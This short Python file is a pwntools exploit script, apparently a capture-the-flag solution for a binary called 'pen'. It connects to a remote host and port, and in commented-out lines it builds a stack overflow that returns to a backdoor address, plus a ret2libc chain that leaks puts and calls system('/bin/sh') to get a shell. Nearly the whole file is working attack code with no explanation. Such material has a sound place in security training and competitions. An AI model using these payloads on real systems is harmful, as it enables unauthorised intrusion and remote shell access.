from pwn import *


code = b'dunbi000'
code += b'cuobi000'
code += b'yufeng00'
code += b'dunfeng0'
code += b'cunfeng0'
code += b'nvfeng00'
code += b'yuefeng0'
code += b'anfeng00'
code += b'jiebi000'

backdoor = 0x400B0F

# p = process('./pen')
elf = ELF('./pen')
# lib = elf.libc
lib = ELF('./libc.so.6')
p = remote('59.110.164.72', 10026)
# p.sendline(code)
# payload = b'a' * 40 + p64(backdoor)
# p.send(payload)

# pop_rdi = 0x0000000000400c53
# payload = b'a' * 40 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4007a0)
# p.sendline(payload)

# puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
# base_addr = puts_addr - lib.sym['puts']
# sym_addr = base_addr + lib.sym['system']
# bin_addr = base_addr + next(lib.search(b'/bin/sh'))
# print(hex(base_addr))

# p.send(code)
# payload = b'a' * 40 + p64(backdoor)
# p.send(payload)
# payload = b'a' * 40 + p64(pop_rdi) + p64(bin_addr) + p64(sym_addr) + p64(0x4007a0)
# p.send(payload)

p.interactive()
